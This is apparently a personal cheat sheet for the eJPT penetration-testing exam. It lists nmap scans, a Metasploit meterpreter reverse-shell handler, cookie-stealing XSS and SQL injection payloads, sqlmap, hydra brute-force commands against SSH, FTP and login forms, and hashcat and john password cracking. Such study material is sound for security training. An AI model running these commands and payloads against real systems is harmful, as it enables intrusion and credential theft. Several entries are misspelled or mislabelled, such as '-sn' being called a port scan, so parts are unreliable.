# ejpt-cheet-sheet
Wireshark:

TCP:
```right click on it then click on Follow then click on TCP streem```

UDP:
```right click on it then click on Follow then click on UDP streem```


|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

Nmap:
```nmap -sn [the ip]/24 -oN file.txt
nmap scan types

-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Port Scan
-sV: Service Version information
-O: Operating System information
nmap 10.10.10.10 #Top 1000 ports (default scan)
nmap -F 10.10.10.10 #Top 100 ports```


|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|



Mataspolite:
```search (the payload name)

use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp # the payload
set RHOST           # the target host
run
```


|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

xss:
```
<script>alert(document.cookie)</script>
><img src=x onerror=alert(1)>
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

finding ip's from websites:
```dig exampil.com

ip route add 192.168.10.0/24 via 10.175.3.1 -- اذا حبينا نضيف الجهاز المخفي```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

sqlmap:
```sqlmap -u ‘http://example.com/view.php?id=1141’ -p id
-u    == url
-p    == paramater
sqlmap -u "http://example.com/view.php?id=1141" --dbs == to get the database name```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

hydra:
```hydra -L users.txt -P pass.txt <service://server> 
hydra -l admin -P pass.txt -f ftp://10.10.10.10
hydra -l root -P pass.txt 192.168.1.105 -t 4 ssh
hydra -l root -P pass.txt <ssh ip>  ssh
ftp <IP>        # enter 'anonymous' as username and password
hydra -U ftp #Hydra uses a module for each service to attack. To get information about a module this command can be used
hydra -L users.txt -P pass.txt <service://server IP> <options>
hydra -L admin -P pass.txt -f ftp://10.10.10.10 #Stop attacking on finding first successful hit for user admin
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt -f -V #Attacking http post form
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

drip:
```dirb http://<IP>/
dirb http://<IP>/ <dictionary_file_path>    # Use dictionary other than default one
dirb http://<IP>/dir -u admin:admin    # When you want to bust recursively but a dir asks for username password which you know already
dirb http://10.10.5.1/ <wordlist path>
dirb http://10.10.5.1/ -u admin:admin #for HTTP authentication
dirb http://10.10.5.1/ <wordlist path>
dirb http://10.10.5.1/ -u admin:admin #for HTTP authentication
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

hashcat:
```
hashcat -m 0 -a 0 exam.hash file.dict
hashcat -m 0 -a 0 exam.hash file.dict -r rule/custom.rule #The rule file contains the rules to create mangled words such as p@ssword, PaSSworD https://hashcat.net/wiki/doku.php?id=rule_based_attack 
hashcat -m 0 -a 3 exam.hash ?l?l?l?l?l?a #mask attack https://hashcat.net/wiki/doku.php?id=mask_attack
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

john the ripper:
```
john hashfile.txt
john --wordlist=/path/to/your/wordlist.txt hashfile.txt
john --format=ntlm hashfile.txt
john --list=formats #all types of passwords we can crack
john -incremental -users:<users list> <file to crack> #if you want to crack only certain users from the password database such as /etc/shadow file
john --show crackme #Check cracked password after completion of cracking session, where crackme is the password database file
john -wordlist=<wordlist> -rules <file to crack> #rules are used for cracking mangled words
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

tips:
```
sql injection

and 1=1; -- -
or 'a'='a'; -- -

hydra,john,hashcat = 
brute force

SHOW databases; #show all databases
SHOW tables FROM databases; #show tables from a database
USE database; #select a database
SELECT * FROM table; #show everything in a certain table
mysql -u USERNAME -pPASSWORD -h <ip host>
directory brute force


'anonymous' as username and password
RCE = remote code execution
xss = cross site scripting
sql == db
ftp = file transfer protocl
ssh = Secure Shell

routting -- توجيه
route -- check routers
```
